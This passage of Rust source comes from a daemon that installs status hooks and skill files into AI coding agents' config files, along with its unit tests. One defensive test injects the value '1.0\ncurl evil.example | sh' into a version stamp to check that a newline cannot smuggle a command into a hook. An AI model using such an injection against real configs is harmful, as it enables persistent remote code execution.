            .map(|bytes| String::from_utf8_lossy(bytes).into_owned())
            .unwrap_or_default();
        let base = trim_newlines(&strip_block(&existing));
        let block = self.render(spec, request);
        let updated = if base.is_empty() {
            format!("{block}\n")
        } else {
            format!("{base}\n\n{block}\n")
        };
        if Some(updated.as_bytes()) == expected.as_deref() {
            return Ok(());
        }
        write_if_unchanged(&self.path, updated.as_bytes(), expected.as_deref())
    }

    fn uninstall(&self) {
        let Some(expected) = read_bytes(&self.path) else {
            return;
        };
        let base = trim_newlines(&strip_block(&String::from_utf8_lossy(&expected)));
        let updated = if base.is_empty() {
            String::new()
        } else {
            format!("{base}\n")
        };
        if updated.as_bytes() == expected {
            return;
        }
        if let Err(error) = write_if_unchanged(&self.path, updated.as_bytes(), Some(&expected)) {
            log(&error);
        }
    }

    /// A comment banner around one `[[hooks]]` table per event. The command is a
    /// TOML multi-line literal string (`'''…'''`) so the shell one-liner's single
    /// and double quotes need no escaping — it never contains three consecutive
    /// single quotes.
    fn render(&self, spec: &HookSpec, request: &InstallRequest) -> String {
        let mut lines = vec![TOML_BLOCK_BEGIN.to_string()];
        for event in &spec.events {
            let command = report_command(
                &event.state,
                &StdinMining::default(),
                HookDialect::KimiToml,
                request,
            );
            lines.push("[[hooks]]".to_string());
            lines.push(format!("event = \"{}\"", event.name));
            if let Some(matcher) = &event.matcher {
                lines.push(format!("matcher = \"{matcher}\""));
            }
            lines.push(format!("command = '''{command}'''"));
            lines.push("timeout = 5".to_string());
            lines.push(String::new());
        }
        if lines.last().map(String::is_empty) == Some(true) {
            lines.pop();
        }
        lines.push(TOML_BLOCK_END.to_string());
        lines.join("\n")
    }
}

/// Remove a previously written termio block, markers inclusive. If both markers
/// are not present the text comes back unchanged, so a hand-edited file is never
/// mangled — and a reinstall therefore leaves exactly one block rather than
/// appending a second.
fn strip_block(text: &str) -> String {
    let Some(begin) = text.find(TOML_BLOCK_BEGIN) else {
        return text.to_string();
    };
    let search_from = begin + TOML_BLOCK_BEGIN.len();
    let Some(end) = text[search_from..].find(TOML_BLOCK_END) else {
        return text.to_string();
    };
    let end = search_from + end + TOML_BLOCK_END.len();
    format!("{}{}", &text[..begin], &text[end..])
}

fn trim_newlines(text: &str) -> String {
    text.trim_matches(|c| c == '\n' || c == '\r').to_string()
}

// MARK: - Skills

fn sync_skills(catalog: &AgentCatalog, request: &InstallRequest) -> Vec<InstallResult> {
    if request.skills != HalfAction::Install {
        // Every skills directory termio has ever installed into — bundled
        // declarations plus the live catalog — so a shipped dir a user override
        // removed or redirected is swept too.
        let mut seen = HashSet::new();
        for agent in catalog.bundled.iter().chain(catalog.all.iter()) {
            let Some(directory) = agent.skill_dir.as_deref() else {
                continue;
            };
            let Ok(folder) = resolved(agent, &format!("{directory}/termio")) else {
                continue;
            };
            if seen.insert(folder.clone()) {
                let resolved = PathBuf::from(&folder);
                if resolved.exists() {
                    // termio owns the folder, so there is no user content in it
                    // to preserve.
                    if let Err(error) = std::fs::remove_dir_all(&resolved) {
                        log(&format!("could not remove {}: {error}", resolved.display()));
                    }
                }
            }
        }
        return Vec::new();
    }

    let skill = request.reporter.skill();
    let mut seen = HashSet::new();
    selected(catalog, request)
        .into_iter()
        .filter_map(|agent| {
            let directory = agent.skill_dir.as_deref()?;
            // Install only for agents whose CLI is actually here, so a box
            // without Cursor never grows a `~/.cursor/skills` it cannot use.
            // Re-checked on every sync, so an agent installed later is picked up.
            let present = match agent.command.as_deref() {
                Some(command) => machine::is_command_installed(command),
                None => true,
            };
            if !present {
                return None;
            }
            let path = match resolved(agent, &format!("{directory}/termio/SKILL.md")) {
                Ok(path) => path,
                Err(reason) => {
                    return Some(InstallResult::new(
                        agent,
                        "skill",
                        "",
                        InstallStatus::Failed,
                        Some(reason),
                    ))
                }
            };
            if !seen.insert(path.clone()) {
                return None;
            }
            // Byte-compare, no version field: the skill is one whole document
            // termio owns.
            let outcome = if read_bytes(&path).as_deref() == Some(skill.as_bytes()) {
                Ok(())
            } else {
                write_atomically(&path, skill.as_bytes(), false)
            };
            Some(InstallResult::new(
                agent,
                "skill",
                &path,
                if outcome.is_ok() {
                    InstallStatus::Installed
                } else {
                    InstallStatus::Failed
                },
                outcome.err(),
            ))
        })
        .collect()
}

// MARK: - Filesystem

fn read_bytes(path: &str) -> Option<Vec<u8>> {
    std::fs::read(machine::expand(path)).ok()
}

fn read_text(path: &str) -> Option<String> {
    read_bytes(path).and_then(|bytes| String::from_utf8(bytes).ok())
}

fn remove(path: &str) {
    let resolved = machine::expand(path);
    if !resolved.exists() {
        return;
    }
    if let Err(error) = std::fs::remove_file(&resolved) {
        log(&format!("could not remove {}: {error}", resolved.display()));
    }
}

/// Commit a **merge**: write only while the file still holds exactly the bytes
/// the merge was computed from. `expected == None` means it must still be
/// absent.
///
/// A hook merges into a file the user also owns and edits, so a
/// read-modify-write that ignores what happened in between silently discards
/// their edits. Refusing is the whole guarantee; re-merging in a loop is not,
/// and rewriting a file somebody is typing in is its own hazard — a lost race
/// reports the agent as not installed, and the setup button is the retry.
///
/// The precondition stays now that the writer runs on the box. The window is
/// microseconds inside one process rather than two network round trips, which
/// makes the check nearly free, not unnecessary: the user's editor is on this
/// machine, and `~/.claude/settings.json` is a file people keep open.
fn write_if_unchanged(path: &str, data: &[u8], expected: Option<&[u8]>) -> Result<(), String> {
    let current = read_bytes(path);
    if current.as_deref() != expected {
        return Err(format!("{path} changed underneath the merge — not writing"));
    }
    write_atomically(path, data, false)
}

/// Written to a sibling temp file and renamed, so a reader never sees a
/// half-written config.
fn write_atomically(path: &str, data: &[u8], executable: bool) -> Result<(), String> {
    use std::io::Write;
    use std::os::unix::fs::PermissionsExt;

    let resolved = machine::expand(path);
    if let Some(parent) = resolved.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|error| format!("could not create {}: {error}", parent.display()))?;
    }
    let temporary = temporary_sibling(&resolved);
    let mut file = std::fs::File::create(&temporary)
        .map_err(|error| format!("could not write {}: {error}", resolved.display()))?;
    file.write_all(data)
        .and_then(|_| file.sync_all())
        .map_err(|error| format!("could not write {}: {error}", resolved.display()))?;
    drop(file);
    let mode = if executable { 0o755 } else { 0o644 };
    std::fs::set_permissions(&temporary, std::fs::Permissions::from_mode(mode))
        .map_err(|error| format!("could not set the mode on {}: {error}", resolved.display()))?;
    std::fs::rename(&temporary, &resolved).map_err(|error| {
        let _ = std::fs::remove_file(&temporary);
        format!("could not write {}: {error}", resolved.display())
    })
}

fn temporary_sibling(path: &Path) -> PathBuf {
    let mut name = path
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| "termio".to_string());
    name.push_str(".termio-tmp");
    path.with_file_name(name)
}

fn log(message: &str) {
    eprintln!("termiod: agent install {message}");
}

#[cfg(test)]
pub(super) mod tests {
    use super::*;
    use crate::agent::manifest::AgentManifest;

    /// The wire spelling the app sends (`Termiod.AgentHookReporter` in
    /// `TermioShared`). Renaming a variant here without the app is how every
    /// hook install in one release failed with "unknown variant".
    #[test]
    fn a_reporter_is_spelled_the_way_the_app_sends_it() {
        assert_eq!(serde_json::to_string(&Reporter::ThisMac).unwrap(), r#"{"kind":"this_mac"}"#);
        assert_eq!(serde_json::to_string(&Reporter::Device).unwrap(), r#"{"kind":"device"}"#);
        let parsed: Reporter = serde_json::from_str(r#"{"kind":"device"}"#).unwrap();
        assert_eq!(parsed, Reporter::Device);
    }

    /// A request whose binary is stated rather than resolved, so a test can
    /// assert generated output byte for byte without depending on where the
    /// test binary happens to sit.
    fn request(reporter: Reporter, binary: &str) -> InstallRequest {
        let mut request = InstallRequest::new(
            None,
            HalfAction::Install,
            HalfAction::Install,
            reporter,
            "9.9.9".into(),
        );
        request.binary = binary.to_string();
        request
    }

    /// A hook spec straight out of a manifest, so a test asserting generated
    /// output is asserting what the real parse produces and not a hand-built
    /// struct that happens to agree with it.
    pub(crate) fn spec_of(json: &str) -> HookSpec {
        AgentManifest::parse(json.as_bytes())
            .expect("parses")
            .definition()
            .expect("resolves")
            .hooks
            .expect("has hooks")
    }

    fn spec(json: &str) -> HookSpec {
        spec_of(json)
    }

    pub(crate) fn local_request(cli: &str) -> InstallRequest {
        request(Reporter::ThisMac, cli)
    }

    pub(crate) fn device_request(daemon: &str) -> InstallRequest {
        request(Reporter::Device, daemon)
    }

    fn claude_spec() -> HookSpec {
        spec(
            r#"{"id":"claudeCode","name":"Claude Code","hooks":{"type":"json",
                "file":"~/.claude/settings.json","dialect":"claude",
                "capturesTranscript":true,"tool":"tool_name",
                "events":[{"on":"Stop","state":"done"}]}}"#,
        )
    }

    #[test]
    fn every_hook_reports_to_the_daemon_that_owns_its_pty() {
        let spec = claude_spec();
        let mac = report_command(
            "done",
            &StdinMining::of(&spec),
            HookDialect::ClaudeNested,
            &local_request("/opt/termiod"),
        );
        assert_eq!(
            mac,
            "'/opt/termiod' set-status \"$TERMIOD_SESSION_ID\" done --transcript \
             --tool-from tool_name 2>/dev/null || true # termio-hooks v9.9.9"
        );
        // And a device's is the same string. One form is the point: the two that
        // existed before drifted apart, and the fingerprint divergence that let a
        // reinstall double every device hook could only exist because of it.
        let device = report_command(
            "done",
            &StdinMining::of(&spec),
            HookDialect::ClaudeNested,
            &device_request("/opt/termiod"),
        );
        assert_eq!(mac, device);
        assert!(is_ours(&mac));
    }

    /// The daemon's `SetStatus` carries state and title only, so the four
    /// stdin-mining flags are dropped rather than emitted for a binary that
    /// would reject them.
    #[test]
    /// This test used to assert the opposite — that a device hook *drops* these
    /// flags, because `SetStatus` had no field for any of them. Growing it first
    /// and switching second is what made one report path an upgrade: a device
    /// agent now carries the transcript, the conversation id, the running tool
    /// and a prompt title, which it could not say at all before.
    #[test]
    fn a_device_hook_now_carries_what_only_the_local_socket_used_to() {
        let spec = spec_of(
            r#"{"id":"codex","name":"Codex","hooks":{"type":"json","file":"~/.codex/hooks.json",
                "dialect":"codex","capturesTranscript":true,"conversation":"session_id",
                "tool":"tool_name","promptTitle":"prompt",
                "events":[{"on":"Stop","state":"done"}]}}"#,
        );
        let command = report_command(
            "working",
            &StdinMining::of(&spec),
            HookDialect::ClaudeNested,
            &device_request("/home/u/.local/bin/termiod"),
        );
        for flag in [
            "--transcript",
            "--conversation-from session_id",
            "--tool-from tool_name",
            "--prompt-title-from prompt",
        ] {
            assert!(command.contains(flag), "a device hook must carry {flag}: {command}");
        }
        assert!(command.contains("set-status \"$TERMIOD_SESSION_ID\" working"));
        // And it is recognizable as ours, so a reinstall replaces it instead of
        // appending a second copy.
        assert!(is_ours(&command));
    }

    /// Cursor reads hook stdout as its JSON reply, so the command must print a
    /// benign empty object even when the binary could not run.
    #[test]
    /// Cursor reads a hook's stdout as its JSON reply, so the command prints a
    /// benign empty object — from the binary when it ran, from the shell when it
    /// could not. One spelling now, on both machines.
    fn cursor_keeps_its_reply_contract() {
        for request in [local_request("/x/termiod"), device_request("/x/termiod")] {
            let command = report_command(
                "working",
                &StdinMining::of(&claude_spec()),
                HookDialect::CursorFlat,
                &request,
            );
            assert!(
                command.ends_with("--reply 2>/dev/null || printf '{}' # termio-hooks v9.9.9"),
                "{command}"
            );
        }
    }

    #[test]
    fn a_users_own_hooks_survive_and_a_destructive_writer_does_not() {
        let mut hooks: serde_json::Map<String, serde_json::Value> = serde_json::from_str(
            r#"{"Stop":[
                 {"hooks":[{"type":"command","command":"my-own-notifier"}]},
                 {"hooks":[{"type":"command","command":"/x/termio agent report done"}]},
                 {"hooks":[{"type":"command","command":"SUPERSET_HOME_DIR=/x superset hook"}]}
               ]}"#,
        )
        .expect("fixture");
        strip_groups(&mut hooks, &is_ours);
        strip_groups(&mut hooks, &is_theirs);
        assert_eq!(
            hooks["Stop"].as_array().map(Vec::len),
            Some(1),
            "only the user's own hook may survive"
        );
        assert!(hooks["Stop"][0]["hooks"][0]["command"]
            .as_str()
            .unwrap()
            .contains("my-own-notifier"));
    }

    /// The stamp is client-supplied and sits in a trailing shell comment, so a
    /// newline in it would put a command of the caller's choosing into a file
    /// the agent runs on every turn — and would keep running it long after that
    /// caller was gone.
    #[test]
    fn a_version_stamp_cannot_end_its_own_comment() {
        let mut request = device_request("/x/termiod");
        request.hook_version = "1.0\ncurl evil.example | sh".into();
        let command = report_command("done", &StdinMining::of(&claude_spec()), HookDialect::ClaudeNested, &request);
        assert!(!command.contains('\n'));
        assert!(command.ends_with("# termio-hooks v1.0curlevil.examplesh"), "{command}");
        request.hook_version = String::new();
        let command = report_command("done", &StdinMining::of(&claude_spec()), HookDialect::ClaudeNested, &request);
        assert!(command.ends_with("# termio-hooks v0"));
    }

    /// An event left with no groups is dropped rather than kept as an empty
    /// array, so an event termio no longer manages leaves no orphan behind.
    #[test]
    fn an_emptied_event_is_removed() {
        let mut hooks: serde_json::Map<String, serde_json::Value> = serde_json::from_str(
            r#"{"Stop":[{"hooks":[{"type":"command","command":"/x/termio agent report done"}]}]}"#,
        )
        .expect("fixture");
        strip_groups(&mut hooks, &is_ours);
        assert!(hooks.is_empty());
    }

    /// The mining flags reach the daemon binary as the hook writes them. Pinned
    /// because the flag names are a contract in three places at once — this
    /// generator, `termiod set-status`'s parser, and the public
    /// `termio agent report` that forwards to it — and a rename in one is a
    /// silent no-op in the others.
    #[test]
    fn the_mining_flags_survive_the_round_trip_to_the_parser() {
        let spec = spec_of(
            r#"{"id":"codex","name":"Codex","hooks":{"type":"json","file":"~/.codex/hooks.json",
                "dialect":"codex","capturesTranscript":true,"conversation":"session_id",
                "tool":"tool_name","promptTitle":"prompt",
                "events":[{"on":"Stop","state":"done"}]}}"#,
        );
        let command = report_command(
            "done",
            &StdinMining::of(&spec),
            HookDialect::ClaudeNested,
            &device_request("/opt/termiod"),
        );
        // Parsed by the very argument parser the hook will hand this to.
        let argv: Vec<&str> = command
            .split(' ')
            .take_while(|token| *token != "2>/dev/null")
            .collect();
        assert_eq!(argv[1], "set-status");
        for pair in [
            ["--conversation-from", "session_id"],
            ["--tool-from", "tool_name"],
            ["--prompt-title-from", "prompt"],
        ] {
            let at = argv.iter().position(|t| *t == pair[0]).unwrap_or_else(|| {
                panic!("{} missing from {command}", pair[0])
            });
            assert_eq!(argv[at + 1], pair[1], "{command}");
        }
        assert!(argv.contains(&"--transcript"), "{command}");
    }

    // MARK: - Stage 3

    fn scratch(label: &str) -> PathBuf {
        let directory = std::env::temp_dir().join(format!(
            "termiod-install-{label}-{}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&directory);
        std::fs::create_dir_all(&directory).expect("scratch dir");
        directory
    }

    fn kimi_spec() -> HookSpec {
        spec_of(
            r#"{"id":"kimi","name":"Kimi","hooks":{"type":"toml","file":"~/.kimi-code/config.toml",
                "dialect":"kimi","events":[{"on":"UserPromptSubmit","state":"working"},
                {"on":"Stop","state":"done"}]}}"#,
        )
    }

    /// The whole reason the TOML dialect appends a marker-delimited block rather
    /// than merging: a second install has to *replace* the first. Get this wrong
    /// and every launch adds another copy of every hook to a file the user also
    /// keeps their provider keys in.
    #[test]
    fn a_second_toml_install_replaces_the_first() {
        let directory = scratch("toml");
        let path = directory.join("config.toml");
        let user_content = "default_model = \"k2\"\n\n[[hooks]]\nevent = \"Stop\"\ncommand = \"mine\"\n";
        std::fs::write(&path, user_content).expect("fixture");

        let spec = kimi_spec();
        let path = path.display().to_string();
        let request = device_request("/home/u/.local/bin/termiod");
        TomlHookBlock::new(&path, &spec, &request)
            .install()
            .expect("installs");
        let once = std::fs::read_to_string(&path).expect("read");

        // A different version, so the block's bytes change and the write is not
        // skipped as a no-op — the case where an append would actually happen.
        let mut newer = device_request("/home/u/.local/bin/termiod");
        newer.hook_version = "99.0".into();
        TomlHookBlock::new(&path, &spec, &newer)
            .install()
            .expect("installs again");
        let twice = std::fs::read_to_string(&path).expect("read");

        assert_eq!(twice.matches(TOML_BLOCK_BEGIN).count(), 1, "{twice}");
        assert_eq!(twice.matches(TOML_BLOCK_END).count(), 1, "{twice}");
        assert_eq!(twice.matches("[[hooks]]").count(), 3, "one user table, two ours");
        assert!(twice.starts_with(user_content.trim_end_matches('\n')));
        assert!(twice.contains("command = \"mine\""), "the user's own hook survives");
        assert_ne!(once, twice, "the newer stamp did land");

        TomlHookBlock::bare(&path).uninstall();
        assert_eq!(
            std::fs::read_to_string(&path).expect("read"),
            user_content,
            "uninstall leaves exactly what was there before"
        );
        let _ = std::fs::remove_dir_all(&directory);
    }

    /// A file with only one of the two markers is hand-edited, and cutting from
    /// a marker to the end of the file would eat whatever follows.
    #[test]
    fn a_half_marked_toml_file_is_left_alone() {
        let mangled = format!("a = 1\n{TOML_BLOCK_BEGIN}\n[[hooks]]\nb = 2\n");
        assert_eq!(strip_block(&mangled), mangled);
        let no_markers = "a = 1\n";
        assert_eq!(strip_block(no_markers), no_markers);
    }

    fn opencode_spec() -> HookSpec {
        spec_of(
            r#"{"id":"opencode","name":"OpenCode","hooks":{"type":"plugin",
                "dir":"~/.config/opencode/plugin","dialect":"opencode",
                "conversation":"properties.sessionID",
                "events":[{"on":"session.idle","state":"done"}]}}"#,
        )
    }

    /// `termio.js` is a name a user could plausibly have chosen. Occupying our
    /// desired path is not evidence that a file is ours.
    #[test]
    fn a_plugin_that_is_not_ours_is_never_claimed() {
        let directory = scratch("plugin");
        let mut spec = opencode_spec();
        spec.directory = Some(directory.display().to_string());
        let theirs = "export const mine = () => {};\n";
        std::fs::write(directory.join("termio.js"), theirs).expect("fixture");

        let request = device_request("/home/u/.local/bin/termiod");
        let error = PluginFile::new(&directory.display().to_string(), &spec, &request)
            .expect("a plugin dialect")
            .install()
            .expect_err("must refuse");
        assert!(error.contains("refusing to overwrite non-termio plugin"), "{error}");
        assert_eq!(
            std::fs::read_to_string(directory.join("termio.js")).expect("read"),
            theirs,
            "the user's file is untouched"
        );

        // An uninstall must not delete it either.
        PluginFile::bare(&spec.directory.clone().unwrap_or_default(), spec.dialect)
            .expect("a plugin dialect")
            .uninstall();
        assert!(directory.join("termio.js").exists());
        let _ = std::fs::remove_dir_all(&directory);
    }

    /// Ours, on the other hand, is replaced — and a reinstall leaves one file,
    /// not two. The legacy name an earlier build used is swept in the same pass.
    #[test]
    fn a_plugin_of_ours_is_replaced_and_its_predecessor_swept() {
        let directory = scratch("plugin-ours");
        let mut spec = opencode_spec();
        spec.directory = Some(directory.display().to_string());
        std::fs::write(
            directory.join("termio-status.js"),
            format!("// Socket marker: {SOCKET_MARKER}\n// an older build\n"),
        )
        .expect("fixture");

        let request = device_request("/home/u/.local/bin/termiod");
        for _ in 0..2 {
            PluginFile::new(&directory.display().to_string(), &spec, &request)
                .expect("a plugin dialect")
                .install()
                .expect("installs");
        }
        let entries: Vec<String> = std::fs::read_dir(&directory)
            .expect("listing")
            .filter_map(|entry| entry.ok())
            .filter_map(|entry| entry.file_name().to_str().map(str::to_string))
            .collect();
        assert_eq!(entries, vec!["termio.js".to_string()], "{entries:?}");
        let source = std::fs::read_to_string(directory.join("termio.js")).expect("read");
        assert_eq!(source.matches("const cli =").count(), 1);

        PluginFile::bare(&spec.directory.clone().unwrap_or_default(), spec.dialect)
            .expect("a plugin dialect")
            .uninstall();
        assert!(!directory.join("termio.js").exists());
        let _ = std::fs::remove_dir_all(&directory);
    }
}
